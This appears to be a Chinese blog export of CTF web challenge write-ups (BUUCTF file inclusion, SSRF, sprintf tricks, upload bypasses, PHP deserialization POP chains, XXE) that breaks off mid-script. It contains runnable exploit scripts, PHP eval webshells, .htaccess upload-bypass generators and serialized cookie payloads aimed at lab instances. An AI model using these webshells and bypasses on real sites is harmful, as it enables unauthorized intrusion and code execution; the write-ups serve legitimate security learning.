Easy MD5记录的一样，POST数据： 1a&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02Sj%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3E%D6%D1mE%AAL4%E1%F2d%CD%E1%073c%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F_D%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%3C%F9%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%90%BC%B5%2F%ED&amp;b&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02S%EA%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3EV%D2mE%AAL4%E1%F2d%CD%E1%073%E3%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F%DFD%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%BC%F8%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%10%BC%B5%2F%ED 第二步就是绕过这个正则表达式，需要FUZZ Linux命令去执行读取文件，这里提供两个命令：sort和strings。 另外，过滤反斜杠 |\\\\|\\\\\\\\|的这两个正则没有写好，导致了反斜杠的逃逸，直接用ca\\t命令。 关于这个反斜杠逃逸我是真的没太看懂。。。 BJDCTF2nd 文件探测 考点 文件包含 SSRF 格式化字符串漏洞 Session绕过 解题 查看HTTP返回头发现有一个Hint：home.php，访问后观察url file参数是一个文件名，用php伪协议尝试文件包含 home.php文件 1234567891011121314151617181920212223242526272829303132333435&lt;?phpsetcookie(&quot;y1ng&quot;, sha1(md5(&#x27;y1ng&#x27;)), time() + 3600);setcookie(&#x27;your_ip_address&#x27;, md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]), time()+3600);if(isset($_GET[&#x27;file&#x27;]))&#123; if (preg_match(&quot;/\\^|\\~|&amp;|\\|/&quot;, $_GET[&#x27;file&#x27;])) &#123; die(&quot;forbidden&quot;); &#125; if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123; die(&quot;not now!&quot;); &#125; if(preg_match(&quot;/.?a.?d.?m.?i.?n.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123; die(&quot;You! are! not! my! admin!&quot;); &#125; if(preg_match(&quot;/^home$/i&quot;, $_GET[&#x27;file&#x27;]))&#123; die(&quot;禁止套娃&quot;); &#125; else&#123; if(preg_match(&quot;/home$/i&quot;, $_GET[&#x27;file&#x27;]) or preg_match(&quot;/system$/i&quot;, $_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;].&quot;.php&quot;; &#125; else&#123; $file = $_GET[&#x27;file&#x27;].&quot;.fxxkyou!&quot;; &#125; echo &quot;现在访问的是 &quot;.$file . &quot;&lt;br&gt;&quot;; require $file; &#125;&#125; else &#123; echo &quot;&lt;script&gt;location.href=&#x27;./home.php?file=system&#x27;&lt;/script&gt;&quot;;&#125; 同样的方式可以读取system.php文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110&lt;?phperror_reporting(0);if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))&#123; echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;&#x2F;script&gt;&quot;; header(&quot;Refresh:0.1;url&#x3D;index.php&quot;); die;&#125;$str2 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;$str3 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;$str4 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;?&gt;&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;&lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt; &lt;title&gt;File Detector&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;normalize.css&quot; &#x2F;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;demo.css&quot; &#x2F;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;component.css&quot; &#x2F;&gt; &lt;script src&#x3D;&quot;js&#x2F;modernizr.custom.js&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;section&gt; &lt;form id&#x3D;&quot;theForm&quot; class&#x3D;&quot;simform&quot; autocomplete&#x3D;&quot;off&quot; action&#x3D;&quot;system.php&quot; method&#x3D;&quot;post&quot;&gt; &lt;div class&#x3D;&quot;simform-inner&quot;&gt; &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt; &lt;ol class&#x3D;&quot;questions&quot;&gt; &lt;li&gt; &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你知道目录下都有什么文件吗?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt; &lt;input id&#x3D;&quot;q1&quot; name&#x3D;&quot;q1&quot; type&#x3D;&quot;text&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;li&gt; &lt;span&gt;&lt;label for&#x3D;&quot;q2&quot;&gt;请输入你想检测文件内容长度的url&lt;&#x2F;label&gt;&lt;&#x2F;span&gt; &lt;input id&#x3D;&quot;q2&quot; name&#x3D;&quot;q2&quot; type&#x3D;&quot;text&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;li&gt; &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你希望以何种方式访问？GET？POST?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt; &lt;input id&#x3D;&quot;q3&quot; name&#x3D;&quot;q3&quot; type&#x3D;&quot;text&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;&#x2F;ol&gt; &lt;button class&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt; &lt;div class&#x3D;&quot;controls&quot;&gt; &lt;button class&#x3D;&quot;next&quot;&gt;&lt;&#x2F;button&gt; &lt;div class&#x3D;&quot;progress&quot;&gt;&lt;&#x2F;div&gt; &lt;span class&#x3D;&quot;number&quot;&gt; &lt;span class&#x3D;&quot;number-current&quot;&gt;&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;number-total&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;error-message&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;span class&#x3D;&quot;final-message&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;form&gt; &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;gem-love.com&quot; target&#x3D;&quot;_blank&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;&lt;&#x2F;section&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;classie.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;stepsForm.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; var theForm &#x3D; document.getElementById( &#39;theForm&#39; ); new stepsForm( theForm, &#123; onSubmit : function( form ) &#123; classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; ); var messageEl &#x3D; theForm.querySelector( &#39;.final-message&#39; ); form.submit(); messageEl.innerHTML &#x3D; &#39;Ok...Let me have a check&#39;; classie.addClass( messageEl, &#39;show&#39; ); &#125; &#125; );&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php$filter1 &#x3D; &#39;&#x2F;^http:\\&#x2F;\\&#x2F;127\\.0\\.0\\.1\\&#x2F;&#x2F;i&#39;;$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123; $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;; $method &#x3D; $_POST[&#39;q3&#39;]; $str1 &#x3D; &quot;~$ python fuck.py -u \\&quot;&quot;.$url .&quot;\\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;; echo $str1; if (!preg_match($filter1, $url) )&#123; die($str2); &#125; if (preg_match($filter2, $url)) &#123; die($str3); &#125; if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123; die($str4); &#125; $detect &#x3D; @file_get_contents($url, false); print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));&#125;?&gt; 重点关注后半段PHP代码，我们可以获取到以下的限制条件： 1.不能包含有flag字符串 2.q2的值必须以http://127.0.0.1/开头，其实相当于是限制了只能通过SSRF读取文件 3.POST获取了q1、q2、q3三个值，其中q1值并没有什么限制，q2后会拼接“.y1ng.txt”字符串，q3中需要以GET或POST字符串开头。 首先是无法直接读取到flag文件，通过home.php文件的源码我们可以猜测应该还存在admin.php文件。其次就是我们传进去的URL即q2值会被拼接上无用字符串，我们可以通过在URL后加 “?a=(GET赋值给一个参数)” 或 “#(锚点)” 来让其失效， 最后一个考的点就是在这两行代码上： 12$detect = @file_get_contents($url, false);print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect)); 这里牵扯到了字符串的格式化的知识，%d会将$detect以二进制数的形式输出，所以并不能得到我们需要的源码。 而主要思路就是让$detect以字符串形式（%s）来输出，我们有两种读取admin.php源码的方法： %1$s —— 这种办法原理是%1$s会将第一个参数用string类型输出，而这道题中第一个参数便是admin.php的源码，语句是： 1print(sprintf(&quot;$url method&amp;content_size:&quot;GET%1$s%d&quot;, $detect)); &#x2F;&#x2F; %1$s会以字符串格式输出$detect，而%d会输出0 %s% —— 这种办法的原理是sprintf()函数中%可以转义掉%，这样语句就变成了： 1print(sprintf(&quot;$url method&amp;content_size:&quot;GET%s%%d&quot;, $detect)); &#x2F;&#x2F; %d前的%被转义 构造出Payload，POST发送给system.php即可获得admin.php的源码： 1q1&#x3D;1&amp;q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php#&amp;q3&#x3D;GET%1$s admin.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phperror_reporting(0);session_start();$f1ag = &#x27;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#x27;; //fakefunction aesEn($data, $key)&#123; $method = &#x27;AES-128-CBC&#x27;; $iv = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;],true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;function Check()&#123; if (isset($_COOKIE[&#x27;your_ip_address&#x27;]) &amp;&amp; $_COOKIE[&#x27;your_ip_address&#x27;] === md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) &amp;&amp; $_COOKIE[&#x27;y1ng&#x27;] === sha1(md5(&#x27;y1ng&#x27;))) return true; else return false;&#125;if ( $_SERVER[&#x27;REMOTE_ADDR&#x27;] == &quot;127.0.0.1&quot; ) &#123; highlight_file(__FILE__);&#125; else &#123; echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#x27;10px&#x27; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#x27;REMOTE_ADDR&#x27;];&#125;$_SESSION[&#x27;user&#x27;] = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);if (isset($_GET[&#x27;decrypt&#x27;])) &#123; $decr = $_GET[&#x27;decrypt&#x27;]; if (Check())&#123; $data = $_SESSION[&#x27;secret&#x27;]; include &#x27;flag_2sln2ndln2klnlksnf.php&#x27;; $cipher = aesEn($data, &#x27;y1ng&#x27;); if ($decr === $cipher)&#123; echo WHAT_YOU_WANT; &#125; else &#123; die(&#x27;爬&#x27;); &#125; &#125; else&#123; header(&quot;Refresh:0.1;url=index.php&quot;); &#125;&#125; else &#123; //I heard you can break PHP mt_rand seed mt_srand(rand(0,9999999)); $length = mt_rand(40,80); $_SESSION[&#x27;secret&#x27;] = bin2hex(random_bytes($length));&#125;?&gt; 代码中第一层if循环else代码块中的mt_srand随机数是真随机数，不能爆破。这里有一个Trick： session绕过。删除cookie，没有cookie中的SESSIONID就找不到对应的session文件，相应的$_SESSION[‘var’]就为NULL，相当于传参NULL。 https://www.jianshu.com/p/9c031dee57b7 所以只要我们在访问admin.php时，删除session访问，代码就会变成： 1$cipher &#x3D; aesEn(&#39;&#39;, &#39;y1ng&#39;); 因此我们就可以计算出密钥，从而获得Flag。 把加密算法改一下得到： 1234567function aesEn($data, $key)&#123; $method &#x3D; &#39;AES-128-CBC&#39;; $iv &#x3D; md5(&#39;174.0.0.2&#39;,true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;echo aesEn(&#39;&#39;, &#39;y1ng&#39;) NPUCTF2020 ezinclude 考点 文件包含 php Segfault 解题 一进来提示 uername/password error，看的我一脸懵逼。查看网页源代码： 1&lt;!--md5($secret.$name)===$pass --&gt; 查看cookie 直接给了Hash值，GET参数pass=Hash值。 跳转到404页面，但是中间明显有一个location重定向，用bp重放。 存在文件包含漏洞，PHP伪协议读物文件 index.php flflflflag.php 查看PHP版本7.0.3，可以使用PHP Segfault上传shell 1234567891011import requestsfrom io import BytesIOfile_data = &#123; &#x27;file&#x27;: BytesIO(b&quot;&lt;?php eval($_POST[cmd]);&quot;)&#125;url = &quot;http://db4c33c0-8231-45b5-8aec-dbcadfeb8704.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;try: r = requests.post(url=url, files=file_data, allow_redirects=False)except Exception as e: print(e) flag在phpinfo中。","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"文件包含","slug":"CTF/文件包含","permalink":"http://ca0y1h.top/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"buuctf刷题——文件上传","date":"2020-08-18T09:59:14.000Z","path":"Web_security/ctf_writeup/11.buuctf刷题——文件上传/","text":"极客大挑战 2019 Upload 考点 phtml绕过后缀 script绕过&lt;? 解题 ACTF2020 新生赛 Upload 考点 phtml后缀绕过 解题 GXYCTF2019 BabyUpload 考点 .htaccess解析绕过 解题 RoarCTF 2019 SimpleUpload 考点 条件竞争 解题 根据报错信息，发现是ThinkPHP3.2.4版本，从GitHub上下载下来审计一下，发现上传模块有一个问题。 可以看到，用户所写得代码使用时未指定files，默认为$_FILES，这意味着，所有$_FILES中的文件都会被上传。而代码只会过滤$_FILES['file']中的文件。所以上传两个文件，一个name为file的正常图片，另一个name为其他的webshell。 12$url = __ROOT__.substr($upload-&gt;rootPath,1).$info[&#x27;file&#x27;][&#x27;savepath&#x27;].$info[&#x27;file&#x27;][&#x27;savename&#x27;] ;echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1)); 最后会打印出$_FILES['file']的文件地址，而不会打印我们shell的地址。 ThinkPHP3默认使用uniqid()函数根据时间生成文件名，两个文件上传时间相近可以爆破。 最后上传的php会被后台替换成flag。 强网杯 2019 Upload 考点 PHP反序列化POP链构造 解题 注册之后查看cookie发现是一个base64编码后的 1a:5:&#123;s:2:&quot;ID&quot;;i:3;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:5:&quot;email&quot;;s:15:&quot;admin@admin.com&quot;;s:8:&quot;password&quot;;s:32:&quot;21232f297a57a5a743894a0e4a801fc3&quot;;s:3:&quot;img&quot;;N;&#125; 扫目录得到 www.tar.gz 压缩包，代码审计 用PHPStorm打开会发现有两个断点，应该是给的hint Register.php Index.php中有一个把cookie反序列化的地方。 这么来看应该是构造反序列化的POP链。 在Profile.php发现关键代码： 1234567891011public function __get($name)&#123; return $this-&gt;except[$name];&#125;public function __call($name, $arguments)&#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125;&#125; 这里肯定是利用__call函数去执行我们的命令了。 构造POP链先找__destruct方法，很明显刚刚Register.php中就有析构函数。 123456public function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125; 这里我们用Register-&gt;checker = Profile，利用Profile-&gt;index()去触发Profile类中的__call魔术方法。 但是我们可以看到Profile.php当中的__call方法调用的参数是 123456public function __call($name, $arguments)&#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125;&#125; 通过文档我们可以知道$name是不存在方法的调用的名字，在这里也就是index，$arguments就是传入调用方法的参数，这里就为空。 而当使用$this-&gt;index的时候，我们会触发另一个魔术方法__get 1234public function __get($name)&#123; return $this-&gt;except[$name];&#125; 这里又调用了$this-&gt;except[$name]，而$name我们可以通过__call调用的值确定为index，而且Profile类存在一个公有类except可以供我们修改。 接着利用_get的返回会使__call方法中的if为真，执行$this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);。 有了POP链之后，我们应该去调用什么函数呢，接着看Profile.php 123456789101112131415161718192021222324252627public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;)); &#125; &#125;else&#123; $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;)); &#125; &#125; 第一个if可以直接pass，第二个if语句如果我们不上传文件也可以直接通过，第三个if直接赋值绕过，然后可以构造图片马绕过getimagesize的判断，控制$this-&gt;filename为php后缀形式，这样利用copy($this-&gt;filename_tmp, $this-&gt;filename)就可以复制出了一个 php webshell 了。 构造payload的exp： 123456789101112131415161718192021222324&lt;?phpnamespace app\\web\\controller;use think\\Controller;class Register&#123; public $checker; public $registed = false; public function __construct($checker) &#123; $this-&gt;checker = $checker; &#125;&#125;class Profile&#123; public $filename_tmp = &#x27;./upload/adeee0c170ad4ffb110df0cde294aecd/00bf23e130fa1e525e332ff03dae345d.png&#x27;; public $filename = &#x27;./upload/adeee0c170ad4ffb110df0cde294aecd/shell.php&#x27;; public $ext = true; public $except = array(&#x27;index&#x27;=&gt;&#x27;upload_img&#x27;);&#125;$register = new Register(new Profile());echo urlencode(base64_encode(serialize($register))); 得到payload 1TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo0OntzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2FkZWVlMGMxNzBhZDRmZmIxMTBkZjBjZGUyOTRhZWNkLzAwYmYyM2UxMzBmYTFlNTI1ZTMzMmZmMDNkYWUzNDVkLnBuZyI7czo4OiJmaWxlbmFtZSI7czo1MToiLi91cGxvYWQvYWRlZWUwYzE3MGFkNGZmYjExMGRmMGNkZTI5NGFlY2Qvc2hlbGwucGhwIjtzOjM6ImV4dCI7YjoxO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MTA6InVwbG9hZF9pbWciO319czo4OiJyZWdpc3RlZCI7YjowO30&#x3D; 填到cookie中，刷新页面 蚁剑连接拿flag。 SUCTF2019 EasyWeb 考点 无字母数字webshell 文件上传 .htaccess利用 解题 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpfunction get_the_flag()&#123; // webadmin will remove your upload file every 20 min!!!! $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[&quot;file&quot;]))&#123; $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension = substr($name, strrpos($name,&quot;.&quot;)+1); if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); $path= $userdir.&quot;/&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125;&#125;$hhh = @$_GET[&#x27;_&#x27;];if (!$hhh)&#123; highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123; die(&#x27;One inch long, one inch strong!&#x27;);&#125;if ( preg_match(&#x27;/[\\x00- 0-9A-Za-z\\&#x27;&quot;\\`~_&amp;.,|=[\\x7F]+/i&#x27;, $hhh) ) die(&#x27;Try something else!&#x27;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt; 和极客大挑战2019 RCE ME类似的payload： 1?_&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86&#x3D;phpinfo 可以成功显示PHPINFO的信息，注意四个点，一是PHP版本是7.2，二是题目的环境是Apache，三是限制了open_basedir，最后是disable_function。 再来看get_the_flag函数，按照题意应该是想让我们通过调用get_the_flag函数来get shell，函数中有三个限制： 文件内容中不能出现&lt;? 使用了exif_imagetype来判断是不是图片 后缀名中不允许出现ph 这里的限制条件就有点像SUCTF2019 CheckIn，不同的是那道题的环境是nginx，可以通过上传.user.ini来绕过。那么这道题如果要通过上传.htaccess来绕过后缀名的限制，就需要绕过exif_imagetype，并且不能用GIF89a等文件头，因为这样虽然能上传成功，但.htaccess文件无法生效。这时有两个办法： 在.htaccess前添加 12#define width 1337#define height 1337 #在.htaccess是注释符，所以.htaccess文件可以生效 在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型) x00x00x8ax39x8ax39 是wbmp文件的文件头，.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess 最后就需要绕过&lt;?，同样也有两个办法，不过只是编码的不同而已，一种是base64编码，一种是uft-16编码，都来了解一下。 先来看utf-16的编码方式，这是.htaccess文件： 12345678#define width 1337 # Define the width#define height 1337 # Define the heightAddType application&#x2F;x-httpd-php .cc # Say all file with extension .php16 will execute phpphp_value zend.multibyte 1 # Active specific encoding (you will see why after :D)php_value zend.detect_unicode 1 # Detect if the file have unicode contentphp_value display_errors 1 # Display php errors 可以绕过的原因借用一下tr1ple师傅的图 也就是说原来是utf-8一个字符一个字节，现在utf-16是两个字节编码一个字符，那么明显可以绕过内容的过滤，exp： 12345678910111213141516171819202122232425262728#!/usr/bin/python3# Description : create and bypass file upload filter with .htaccess# Author : Thibaud Robin# Will prove the file is a legit xbitmap file and the size is 1337x1337SIZE_HEADER = b&quot;\\n\\n#define width 1337\\n#define height 1337\\n\\n&quot;def generate_php_file(filename, script): phpfile = open(filename, &#x27;wb&#x27;) phpfile.write(script.encode(&#x27;utf-16be&#x27;)) phpfile.write(SIZE_HEADER) phpfile.close()def generate_htacess(): htaccess = open(&#x27;.htaccess&#x27;, &#x27;wb&#x27;) htaccess.write(SIZE_HEADER) htaccess.write(b&#x27;AddType application/x-httpd-php .cc\\n&#x27;) htaccess.write(b&#x27;php_value zend.multibyte 1\\n&#x27;) htaccess.write(b&#x27;php_value zend.detect_unicode 1\\n&#x27;) htaccess.write(b&#x27;php_value display_errors 1\\n&#x27;) htaccess.close() generate_htacess()generate_php_file(&quot;shell.cc&quot;, &quot;&lt;?php eval($_POST[&#x27;shell&#x27;]); ?&gt;&quot;) 上传两个文件 1234567891011121314151617import requestsurl = &quot;http://8bf8acd4-49c6-40c6-9bfe-688945f733ac.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;payload = &#123;&#125;headers = &#123;&#125;htaccess_files = [ (&#x27;file&#x27;, open(&#x27;.htaccess&#x27;, &#x27;rb&#x27;))]shell_files = [ (&#x27;file&#x27;, open(&#x27;shell.cc&#x27;, &#x27;rb&#x27;))]response = requests.request(&quot;POST&quot;, url, headers=headers, data=payload, files=htaccess_files)print(response.text)response = requests.request(&quot;POST&quot;, url, headers=headers, data=payload, files=shell_files)print(response.text) 验证一下 用蚁剑连接，加载绕过disable_function的插件 第二种是用base64编码绕过 htaccess文件内容 1234#define width 1#define height 1AddType application&#x2F;x-httpd-php .ccphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.cc&quot; shell的内容 12GIF89a12 &#x2F;&#x2F; 12为了满足base64算法凑足八个字节PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pPz4&#x3D; &#x2F;&#x2F;&lt;?php @eval($_POST[cmd])?&gt;的base64编码 拓展 .htaccess trick总结 PHP7绕过open_basedir BSidesCF2019 SVGMagic 考点 SVG文件格式 XXE读取文件 解题 先来看看什么是SVG。 SVG 意为可缩放矢量图形（Scalable Vector Graphics）， 使用 XML 格式定义图像。 看一个实例 用常规的XXE文件读取payload 这个地方有个坑就是flag的文件位置在当前目录，而proc/self/cwd就代表当前路径。 HFCTF2020 BabyUpload 考点 代码审计 session伪造 解题 审计源码可以发现这几个点 session中存储了身份信息，默认事guest 通过参数可以上传文件和下载文件 既然这样，那我们就先把session文件下载下来看看是什么样子的。 应该是用php_binary方式序列化的session。 那么现在的思路就是： 伪造admin session --&gt; 上传新的sess文件 --&gt; 将cookie改成sess文件sha256加密后的字符串 但是现在还有一个问题就是如果绕过对success.txt的判断。 由于文件名不可控，我们就无法上传一个名为success.txt的文件，但是file_exists函数的作用的是检查文件或目录是否存在，所以我们用attr创建一个名为success.txt的目录就可以过这个判断。 123456789101112131415161718192021222324252627282930313233343536373839import requestsfrom io import BytesIOimport hashliburl = 